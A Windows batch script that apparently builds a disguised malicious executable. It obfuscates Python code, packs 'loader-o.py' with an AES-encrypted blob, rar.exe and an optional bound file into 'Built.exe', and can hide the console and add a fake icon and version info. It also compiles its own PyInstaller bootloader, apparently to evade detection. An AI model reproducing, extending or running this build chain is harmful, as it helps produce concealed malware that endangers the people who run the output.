@echo off
setlocal ENABLEDELAYEDEXPANSION
cls
if not exist activate (
    echo venv not found
    pause
    exit
) else (
    call activate
)
cls
if not exist REQS (
    title Installing requirements...
    where gcc > NUL 2>&1
    if !errorlevel! equ 0 (
        set PYINSTALLER_COMPILE_BOOTLOADER=1
	set PYINSTALLER_BOOTLOADER_WAF_ARGS=--gcc
    ) else (
        set PYINSTALLER_COMPILE_BOOTLOADER=
    )
    
    python -m pip install -r requirements.txt --no-cache-dir --no-binary pyinstaller --verbose
    type NUL > REQS
)
cls
title Obfuscating...
python process.py
title Converting to exe...
if exist "bound.blank" (set "bound=--add-data bound.blank;.") else (set "bound=")
if exist "noconsole" (set "mode=--noconsole") else (set "mode=--console")
if exist "icon.ico" (set "icon=icon.ico") else (set "icon=NONE")
pyinstaller %mode% --onefile --clean --noconfirm loader-o.py --name "Built.exe" -i %icon% --hidden-import urllib3 --hidden-import sqlite3 --hidden-import pyaes --hidden-import ctypes --hidden-import ctypes.wintypes --hidden-import json --add-binary rar.exe;. --add-data rarreg.key;. --add-data blank.aes;. --version-file version.txt %bound%
if %errorlevel%==0 (
    cls
    title Post processing...
    python postprocess.py
    explorer.exe dist
    exit
) else (
    color 4 && title ERROR
    pause > NUL
    exit
)
